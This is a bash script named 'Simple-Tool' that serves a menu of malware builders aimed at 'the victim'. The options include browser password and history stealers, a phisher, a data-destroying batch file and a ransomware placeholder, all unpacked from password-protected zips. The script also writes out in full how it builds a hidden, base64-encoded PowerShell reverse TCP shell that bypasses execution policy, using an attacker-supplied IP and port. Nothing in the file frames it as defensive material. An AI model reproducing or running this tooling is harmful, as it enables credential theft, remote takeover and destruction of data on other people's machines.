#!/bin/bash/

trap 'printf "\n";stop;exit 1' 2

clear
printf '''\n\e[1;32m   _____ _                 _          _______          _  \e[0m'''
printf '''\n\e[1;32m  / ____(_)               | |        |__   __|        | | \e[0m'''
printf '''\n\e[1;32m | (___  _ _ __ ___  _ __ | | ___ ______| | ___   ___ | | \e[0m'''
printf "\n\e[1;32m  \___ \| | '_ ' _ \| '_ \| |/ _ \______| |/ _ \ / _ \| | \e[0m"
printf '''\n\e[1;32m  ____) | | | | | | | |_) | |  __/      | | (_) | (_) | | \e[0m'''
printf '''\n\e[1;32m |_____/|_|_| |_| |_| .__/|_|\___|      |_|\___/ \___/|_| \e[0m'''
printf '''\n\e[1;32m                    | |                                   \e[0m'''
printf '''\n\e[1;32m                    |_|                                   \e[0m\n'''
echo ""
echo ""
printf "\e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;36m Notification[AutoType_In_Cmd]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;36m Browser_Password_Stealers[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;36m Ps_Reverse_Tcp_Payload[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;36m Browser_History_Stealer\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;36m Login_Phisher[Undetectable]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;36m Skull_Logo\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;36m Unstopper[Continues CD Ejector And Mouse Swapper]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;36m System_Destroyer[Data Eater]\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;36m Ps_Ransomware[Undetectable]\e[0m\n"
read -p $'\n\e[1;36mEnter The Option : \e[0m' menu


if [[ $menu == 01 || $menu == 1 ]]
then
clear
printf "\e[1;31mEnter The Message To Auto Type And Display In FullScreen In CMD\e[0m"
printf "\e\n[1;31mTottaly For Prank The Victim Or Making Notify To The Victim\e[0m"
read -p $'\n\e[1;33mEnter_Output_File_Name: \e[0m' Autotyper
read -p $'\n\e[1;33mEnter_Message: \e[0m' msg_display
echo strText='"'$msg_display'"' >> $Autotyper.vbs
printf '''\nCall AutoTypeWriter(strText)\n''' >> $Autotyper.vbs
printf '''Sub AutoTypeWriter(strText)\n''' >> $Autotyper.vbs
printf '''  intPause = 150\n''' >> $Autotyper.vbs
printf '''  Set Ws = CreateObject("WScript.Shell")\n''' >> $Autotyper.vbs
printf '''  Ws.Run "cmd.exe && clear",3\n''' >> $Autotyper.vbs
printf '''  WScript.Sleep 1000\n''' >> $Autotyper.vbs
printf '''  Set WshShell = WScript.CreateObject("WScript.Shell")\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "color 0a"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "prompt !!Message!! : "\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "cls"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{ENTER}"\n''' >> $Autotyper.vbs
printf '''  WshShell.SendKeys "{F11}"\n''' >> $Autotyper.vbs
printf '''  intTextLen = Len(strText)\n''' >> $Autotyper.vbs
printf '''  For x = 1 to intTextLen\n''' >> $Autotyper.vbs
printf '''    strTempText = Mid(strText,x,1)\n''' >> $Autotyper.vbs
printf '''    Ws.Sendkeys strTempText\n''' >> $Autotyper.vbs
printf '''    WScript.Sleep intPause\n''' >> $Autotyper.vbs
printf '''  Next\n''' >> $Autotyper.vbs
printf '''End Sub\n''' >> $Autotyper.vbs
printf "\e\n[1;36m^_^ Happy Prank ^_^\e[0m\n"
sleep 3

elif [[ $menu == 02 || $menu == 2 ]]
then
clear
printf "\e\n[1;33mSteal The Browser Passwords As A Text File From The Victim\e[0m"
read -p $'\n\e[1;33mEnter_Output_File_Name: \e[0m' stealer
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== DarkRCovery_Obfuscated.zip
clear
mv DarkRCovery_Obfuscated.vbs $stealer.vbs
printf "\e\n[1;36m^_^ Happy Steal ^_^\e[0m\n"
sleep 3

elif [[ $menu == 03 || $menu == 3 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== powershell_reverse_tcp.zip
clear
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' ps_tcp
read -p $'\e\n[1;33mEnter The IpAdress:\e[0m' ip
read -p $'\e\n[1;33mEnter The Port:\e[0m' port
sed -i 's/_ipaddress_/'$ip'/g' powershell_reverse_tcp.txt
sed -i 's/_port_/'$port'/g' powershell_reverse_tcp.txt
printf "\e\n[1;32m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[0m\n"
sleep 1
echo -n "%COMSPEC% /b /c start /b /max powershell.exe -windowstyle hidden -ExecutionPolicy bypass -NoProfile -EncodedCommand " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
rm -rf powershell_reverse_tcp.txt
printf "\e\n[1;36m^_^ Happy Hack ^_^\e[0m\n"
sleep 3

elif [[ $menu == 04 || $menu == 4 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== GudGuy.zip
clear
printf "\e\n[1;33mOutput File Will Save As Text File In Temp\e[0m"
read -p $'\e\n[1;31mEnter_Output_File_Name: \e[0m' browse_history
mv GudGuy.ps1 $browse_history.ps1
rm -rf GudGuy.ps1
printf "\e\n[1;36m^_^ Happy Steal ^_^\e[0m\n"
sleep 3

elif [[ $menu == 05 || $menu == 5 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== Pass_Phisher.zip
clear
mkdir Pass_Phisher
mv CredsPhish.ps1 Pass_Phisher
mv NewPhish.ps1 Pass_Phisher
printf "\e\n[1;35mFile Is Saved In Pass_Phisher Folder\e[0m"
printf "\e\n[1;36m^_^ Happy Phish ^_^\e[0m\n"
sleep 3

elif [[ $menu == 06 || $menu == 6 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== skull_logo.zip
clear
read -p $'\e\n[1;33mEnter_Output_File_Name: \e[0m' skull
mv skull_logo.bat $skull.bat
printf "\e\n[1;36m^_^ Happy Hack ^_^\e[0m\n" 
sleep 3

elif [[ $menu == 07 || $menu == 7 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== Unstoppable.zip
clear
read -p $'\e\n[1;33mEnter_Output_File_Name: \e[0m' unstop
mv Unstoppable.vbs $unstop.vbs
printf "\e\n[1;36m^_^ Happy Hack ^_^\e[0m\n"
sleep 3

elif [[ $menu == 08 || $menu == 8 ]]
then
unzip -P V0RCc1psRlhNV1pTTWpscldEQTViVmd3VW14WldGSnZXSGM5UFE9PQ== venom.zip
clear
read -p $'\e\n[1;33mEnter_Output_File_Name: \e[0m' venom
mv venom.bat $venom.bat
printf "\e\n[1;36m^_^ Happy Hack ^_^\e[0m\n"
sleep 3

elif [[ $menu == 09 || $menu == 9 ]]
then
clear
printf "\e\n[1;36mIts Comming Soon....\e[0m\n"
sleep 3

else
clear
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
printf "\e\n[1;5;31m-+-Invalid Option-+-\e[0m\n"
printf "\e\n[1;5;31m-+-+-+-+-+-+-+-+--+-\e[0m\n"
sleep 3
fi

